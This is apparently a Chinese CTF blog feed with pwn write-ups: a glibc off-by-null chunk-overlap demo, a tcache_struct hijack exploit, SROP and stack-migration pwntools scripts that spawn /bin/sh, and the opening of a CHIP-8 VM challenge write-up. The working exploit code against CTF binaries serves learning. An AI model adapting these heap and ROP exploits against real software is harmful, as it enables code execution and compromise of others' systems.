class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Take b out first by allocating 0x510&quot;</span>);<br><span class="hljs-type">void</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>]+<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span><br><span class="hljs-string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;  <span class="hljs-comment">// b-&gt;fd &lt;- fake_chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span><br><span class="hljs-string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);<br><span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">free</span>(a2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)a)[<span class="hljs-number">1</span>], victim);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);<br><span class="hljs-type">void</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="hljs-type">void</span> **)a3)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// pass unlink_chunk in malloc.c:</span><br><span class="hljs-comment">//      mchunkptr fd = p-&gt;fd;</span><br><span class="hljs-comment">//      mchunkptr bk = p-&gt;bk;</span><br><span class="hljs-comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span><br><span class="hljs-comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And we have:\n&quot;</span><br> <span class="hljs-string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span><br> <span class="hljs-string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span><br> );<br><br><span class="hljs-comment">// step6: add fake chunk into unsorted bin by off-by-null</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Take victim out from unsortedbin&quot;</span>);<br><span class="hljs-type">void</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, victim2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;off-by-null into the size of vicim&quot;</span>);<br><span class="hljs-comment">/* VULNERABILITY */</span><br>((<span class="hljs-type">char</span> *)victim2)[<span class="hljs-number">-8</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-comment">/* VULNERABILITY */</span><br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span><br><span class="hljs-string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span><br><span class="hljs-string">&quot;add the merged chunk into unsortedbin.&quot;</span><br>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span><br><span class="hljs-string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span><br><span class="hljs-string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="hljs-type">void</span> **)a3)[<span class="hljs-number">1</span>], prev, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>], prev);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span><br><span class="hljs-string">&quot;And it is overlapped with the prev chunk&quot;</span>);<br><br><span class="hljs-comment">// step7: validate the chunk overlapping</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);<br><span class="hljs-type">void</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);<br><span class="hljs-built_in">memset</span>(merged, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)merged);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Overwrite prev&#x27;s content&quot;</span>);<br><span class="hljs-built_in">memset</span>(prev2, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)merged);<br><br>assert(<span class="hljs-built_in">strstr</span>(merged, <span class="hljs-string">&quot;CCCCCCCCC&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>首先第一步, 通过各种手段使得我们真实的利用从后两字节为\x00的地址处开始, 之后先一堆东西, 不知道在做什么</p><p>此时我们把断点下到63行, 观察一下现在堆上的东西</p><p><img src="image-20231024003817588.png" alt="image-20231024003817588"></p><p>此时unsorted中的形式是这样的:</p><p><img src="image-20231024004308565.png" alt="image-20231024004308565"></p><blockquote><p>10.31 先 🕊 🌶</p></blockquote><h2 id="0x02-2️⃣-3️⃣5️⃣">0x02 2️⃣.3️⃣5️⃣</h2><p>没写完 先🕊</p><h2 id="0x03-Othersheap">0x03 Othersheap</h2><blockquote><p>0x03就是 平时刷什么题的时候遇到的有意思的做法 往这里一起写一写</p><p>这个博客是分很多天写的, 逻辑确实很混乱, 但是我觉得还好吧()</p></blockquote><h3 id="1-tcache-struct-hijack">1.tcache_struct hijack</h3><p>例题是ciscn 19年的final3, buu有, 这个题在这里不选择常规的方法, 因为他原本的环境里没有double free的检测</p><p><img src="image-20231031210329468.png" alt="image-20231031210329468"></p><p>每次分配后会给出地址, 这里是唯一输出, 所以首先思路应该是分配到在libc里的一个chunk.</p><p>然后还能看到一个裸的uaf, 如果不用stash可以伪造一个大chunk进unsorted再改</p><blockquote><p>但是我怎么感觉还不如这种方法, 又绕过了检查, <s>又不是那么难想</s></p></blockquote><p>所以在这里:</p><ul><li><p>我们首先是使用stash机制完成double free</p></li><li><p>但是stash需要很多次申请机会, 本身我们就只有24次, 实际上的stash过程就需要用到19次, 直到20th才轮到我们去进行任意地址写</p></li><li><p>故选择劫持 tcache struct, 就是放链表的那个大的结构体</p><ul><li>该结构体在libc2.27中是0x250大小, (后续版本可能有些差别), 前0x40段是count, 后面的是链表头地址</li><li>可以通过这里改count, 改掉这个之后可以达到<strong>不进入tcache</strong>的效果</li><li>由于链表头就在这个chunk里存着, 故可以通过控制这里达到直接控制chunk的效果, 似乎能做到些任意写</li></ul><blockquote><ul><li>这个结构体扔进unsorted之后, 再申请是不切割的(2.27的这个题是这样的), 暂时我还不知道是为什么,</li></ul></blockquote></li></ul><p>后续去搜了搜, 好像有点像个板子(), exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./cf33&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,27946)</span><br>elf=ELF(<span class="hljs-string">&quot;./cf33&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;index&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;size&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&quot;something&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;gift :0x&quot;</span>)<br>heap_base=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x11e70</span><br>log.success(<span class="hljs-string">&quot;heap_base=&quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    remove(i)<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">7</span>)<br>remove(<span class="hljs-number">8</span>)<br>remove(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">17</span>):<br>    add(i,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x70</span>,p64(heap_base+<span class="hljs-number">0x10</span>))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">18</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>payload=(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">35</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(heap_base+<span class="hljs-number">0x10</span>)*<span class="hljs-number">6</span><br><span class="hljs-comment">#print(payload)</span><br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x70</span>,payload)<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">20</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">22</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;gift :0x&quot;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&quot;libc_base=&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">23</span>,<span class="hljs-number">0x50</span>,(<span class="hljs-string">b&#x27;\x07&#x27;</span>*<span class="hljs-number">10</span>).ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) * <span class="hljs-number">2</span>)<br>add(<span class="hljs-number">24</span>,<span class="hljs-number">0x10</span>,p64(libc_base+libc.sym[<span class="hljs-string">&quot;system&quot;</span>]))<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">10</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>主要思路是在19次达成stash之后, 从第20次起改掉0x250的count位和小chunk的链表头, 使结构体chunk进入unsorted, 再分配2次即可分配到libc里, 通过输出地址leak libc</p><p>然后再次劫持, 把链表头改成free_hook即可, 后续是常规过程.</p><h2 id="0x04-Others">0x04 Others</h2><p>在脱离用户态之前这里希望都可以一直更新, 能一直写下去就好.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Advanced Stack Summary</title>
    <link href="/2023/10/22/Stack/"/>
    <url>/2023/10/22/Stack/</url>
    
    <content type="html"><![CDATA[<p>高档栈题的一点点总结</p><span id="more"></span><h2 id="0x00-O-o">0x00 O.o</h2><p><s>一般的0x00是废话环节</s>…</p><p>前段时间有一天突然有种水平上不去下不来的感觉, 水平说高不高说低不低, 很奇怪, 跟前辈聊了聊, wings给了个建议是做个总结, 一想, 也没什么坏处, 于是写几个高档的栈题的点, 大概是3个, 迁移, srop, ret2dlresolve.</p><blockquote><p>癌症晚期了, 👴8💊当白银</p></blockquote><p>后续应该还会加点别的, 毕竟栈题这一块还是有不少的小的东西, 例如一些好玩的fmt.</p><blockquote><p>23.10.23：目前下面的题应该全是newstar week3的, week3的题很不错, 一道多次迁移, 一道srop, 一道rtdlr, 缺的营养这一块给补上来了, 饱饱的, <s>也正好是我写这个东西的原因</s></p></blockquote><h2 id="0x01-Srop">0x01 Srop</h2><blockquote><p><s>个人觉得是一个比较奇怪的东西</s>😔</p></blockquote><h3 id="原理">原理</h3><p>主要利用signal机制, linux下一个程序中断的机制, 中断时, 内核为保存程序的上下文, 将所有寄存器信息入栈.</p><p><strong>中断结束后, 内核将执行sigreturn系统调用, 根据之前入栈的信息将寄存器恢复, 由于该空间可写, 故可以被伪造, 并且由于内核将sigreturn的地址放在栈顶, 故利用时只需要将伪造的frame串放置于系统调用地址后方</strong></p><blockquote><p>其实这个地方不是很确定, 但是实际上很多情况下都是这么利用的, 应该就是因为实际上的frame就在那个地址的后方去达到伪造的作用的.</p><p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p><p>看过最近的几个题之后我觉得似乎确实就是这样的, 至于之前的题有可能出现不是紧邻, 感觉两种情况, 1是题的情况不同要具体分析, 2是<s>我是个猪鼻没看明白</s></p></blockquote><p>由于功能非常强大, 故只要有syscall, 有/bin/sh串 的地址, 可以构造出一次调用, 即可随意getshell, .并且如果一次不能getshell的话, 可以随意控制sp ip寄存器, 不必担心例如迁移, 初始化等等导致的栈环境变化, 这便导致了这种方法的杀伤力非常之强.</p><p>上周newstar里面的srop相对来说比较简单, 小移一次bp多构造一次read输入到可控的bss段即可.</p><blockquote><p><s>然后上周这个猪鼻因为frame里面系统调用号写成0x59以至于卡了半个晚上跑了, 我自己觉得是有点难绷的</s></p></blockquote><p>如果要多次利用, 将ip的位置指向syscall ret即可, 应该syscall函数也是可以的(我不知道我没试过), 总之pop一步ip将sp(也就是下一个构造好的sropframe地址)pop进ip即可.</p><h3 id="exp">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>syscall=<span class="hljs-number">0x401040</span><br>bss=<span class="hljs-number">0x404500</span><br>leave=<span class="hljs-number">0x401171</span><br>rdiret=<span class="hljs-number">0x401203</span><br><br>srop1=SigreturnFrame()<br>srop1.rdi=<span class="hljs-number">59</span><br>srop1.rsi=bss-<span class="hljs-number">0x30</span><br>srop1.rdx=<span class="hljs-number">0</span><br>srop1.rcx=<span class="hljs-number">0</span><br>srop1.rsp=bss<br>srop1.rip=syscall<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(leave)<br>r.sendline(payload)<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(rdiret)+p64(<span class="hljs-number">15</span>)+p64(syscall)+<span class="hljs-built_in">bytes</span>(srop1)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>感觉机制比较奇怪, 但是可能实际用起来意外的好用, <s>不是很懂你们内核的机制</s></p><h2 id="0x02-Migration">0x02 Migration</h2><p>这个知识点其实困扰了我个人很久, 因为迁移前后栈环境似乎会有很多微小的变化, 并且对于这种方法我始终有一种别扭的感觉在里面, 一到多次迁移就可能会在sp或者哪里出一些莫名其妙的问题.</p><h3 id="原理-v2">原理</h3><p>原理感觉很简单, 主要利用函数调用结束的一些规矩, rop实际在leave ret时发挥作用, 但是如果在栈空间过小以至于只够溢出不够使用时, 普遍使用重复leave ret将sp和bp拉走, 迁移到我们想要的位置, 诸如bss段/已知栈地址.</p><p>这是比较好懂的, 但是实际应用过程并不是很简单的在后面加一步leave ret, 很多时候输入次数不够, 常常选择先将bp拉走, 根据缓冲区以bp寻址的特点迁移布栈, 最后布栈完成一步leave ret将ip拉来开始执行.</p><p>例题有说是newstar week3的题.</p><h3 id="exp-v2">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>putsplt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>putsgot=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>bss=elf.bss()+<span class="hljs-number">0xa00</span><br>rdiret=<span class="hljs-number">0x4012b3</span><br>rbpret=<span class="hljs-number">0x40115d</span><br>leaveret=<span class="hljs-number">0x401227</span><br>ret=<span class="hljs-number">0x40101a</span><br>read=<span class="hljs-number">0x4011f3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(bss)+p64(read)<br>r.send(payload)<br><br><span class="hljs-comment">#debug()</span><br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(putsgot)+p64(putsplt)+p64(rbpret)+p64(bss+<span class="hljs-number">0x100</span>)+p64(read)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>payload+=p64(bss-<span class="hljs-number">0x58</span>)+p64(leaveret)<br>r.send(payload)<br><br>putsaddr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,putsaddr)<br>libcbase=putsaddr-libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sysaddr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshaddr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>gdb.attach(r)<br>pause()<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(binshaddr)+p64(sysaddr)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(bss+<span class="hljs-number">0xa8</span>)+p64(leaveret)<br><br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>有个点需要注意, 在后续过程中很有可能sp会因为调用函数的时候开栈帧被拉回来, 由于0x1000页对齐, bss段其实是很大一部分, 如果偏移写少了拉回来就挂掉了, 所以迁bss的时候普遍要往更高地址迁, 诸如这个0xa00.</p><blockquote><p>这个题第一次迁移的时候要拉bp似乎也算是个特别的点.</p></blockquote><h2 id="0x03-ret2dlresolve">0x03 ret2dlresolve</h2><p>没怎么看懂, 过两天再看看往这补8🔨</p><blockquote><p>为了这盘醋包的饺子, 但是今天有点晚了, 小🕊️一手</p></blockquote><h2 id="0x04-Others">0x04 Others</h2><p>week3的时候, 周一晚上做第二道题能通本地不能通远程, 找了一晚上原因也不知道是为什么, 然后写srop, 写完卡在奇怪的系统调用上, <s>当时没发现是0x59的调用号</s>, 干脆跑了不做了, 然后这周搭博客+做一道vm+干了些别的事情就到今天, 倚着官方的wp从头到尾看了看自己没什么水平的栈, 突然意识到一个问题:</p><p>思维有点死, 例如那个srop我甚至没能想到多次利用程序已有的read输入, 做pwn原本应该多活跃一下思维去利用应有的东西的, 但是好像做的时候并没有想到可以拿一些片段性的程序出来用, 老毛病了, 再做题先晃晃脑袋.</p><blockquote><p>栈迁移的先迁bp再寻址读入拉sp也是前段时间才学到的</p></blockquote><p>不知道是不是做的题太少了, 还是最近就没怎么做这一类的灵活栈题, 堆题也没怎么做, 那我到底干啥了（x</p><p>除了学方法的同时, 感觉也要适当去哪里刷点题什么的, 最近要恢复刷各种比赛和buu, nss了.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PWNmeCTF CHIP-8 复现</title>
    <link href="/2023/10/18/CHIP-8/"/>
    <url>/2023/10/18/CHIP-8/</url>
    
    <content type="html"><![CDATA[<p>这种VMpwn对带🔥来说刚刚好, 而对我这个♿就有丶超前🌶️😭</p><span id="more"></span><h2 id="0x00-材料">0x00 材料</h2><p>一个叫PWNME的比赛的一道题, 链接在这, 以下是照着wp算是复现的过程, 总之是看的想死😭</p><p><a href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8">CHIP-8github原网址</a></p><h2 id="0x01-分析">0x01 分析</h2><p>拿来之后发现clone了一个仓库, 大致一看, 应该像是一个chip8语言的模拟器, 似乎也可以说是一个vm.</p><p>CHIP-8, 小查了一下:</p><p><a href="https://en.wikipedia.org/wiki/CHIP-8">https://en.wikipedia.org/wiki/CHIP-8</a></p><p><img src="image-20231018212805437.png" alt="image-20231018212805437"></p><blockquote><p><s>这个人的英语目前像屎所以还是要靠谷歌翻译x  x</s></p></blockquote><p>给了一个patch, 这个patch分析一下, 最主要的功能感觉应该就是<code>把flag扔进去</code>, 告诉你flag在这里了.</p><p>其次下面看着是调试性的语句也给加了点注释, 还有main函数里关闭缓冲的初始化性质语句.</p><p><strong>patch里面有关flag的部分是在Machine类里面, 看一下这个类</strong>:</p><ul><li><p>在<code>Machine.hpp</code>中, 定义了一堆莫名其妙的东西, 但是可以看懂有<code>register</code>, <code>stack</code>, <code>memory</code>这种很熟悉的字样, 具体联系这个维基百科稍微看看:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 